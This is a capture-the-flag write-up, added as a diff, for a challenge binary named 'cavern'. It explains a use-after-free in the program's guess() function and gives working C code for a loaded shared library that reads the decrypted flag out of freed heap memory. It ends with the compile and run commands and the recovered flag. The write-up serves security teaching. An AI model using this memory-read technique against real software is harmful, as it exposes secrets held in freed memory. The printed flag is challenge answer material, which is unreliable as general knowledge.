@@ -1,0 +1,63 @@
+The flag is stored in encrypted form, and the program allows us to load our own shared library containing a run() function.
+
+1. Analyze source code
+First, we examined cavern.c and found that the program loads our shared library using dlopen() and executes its run() function. We also discovered the following structure:
+
+struct offering {
+    char guess[64];
+    char secret[64];
+};
+
+The secret field stores the decrypted flag, starting at an offset of 64 bytes.
+
+2. Find vulnerability
+Inside the guess() function, we noticed these lines:
+
+offering_free(offering);
+return offering;
+
+The program frees the allocated memory but still returns a pointer to it.
+
+3. Create offer.c
+We created a file called offer.c containing a run() function.
+The idea was to call guess() with an arbitrary password, obtain the returned pointer, and attempt to read the secret from the freed memory.
+nano offer.c
+
+#include <stdio.h>
+#include <dlfcn.h>
+
+typedef void *(*guess_fn)(char *);
+
+void run(void) {
+    guess_fn guess =
+        (guess_fn)dlsym(RTLD_DEFAULT, "guess");
+
+    if (!guess) {
+        puts("Cannot find guess()");
+        return;
+    }
+
+    void *ptr = guess("hello");
+
+    if (!ptr)
+        return;
+
+    unsigned char *secret =
+        (unsigned char *)ptr + 64;
+
+    printf("FLAG: ");
+    fwrite(secret, 1, 55, stdout);
+    printf("\n");
+}
+
+The offset of 64 bytes allows us to reach the secret field, while 55 is the flag length defined in the source code.
+
+4. Compile and run
+Compile our code into a shared library:
+gcc -shared -fPIC -o offer.so offer.c -ldl
+Then
+./cavern ./offer.so
+
+
+Result.
+FLAG: cctf{RemEmBer_tHeRe_Is_n0_sp0oN_free_From_naSA1_DemoNs}
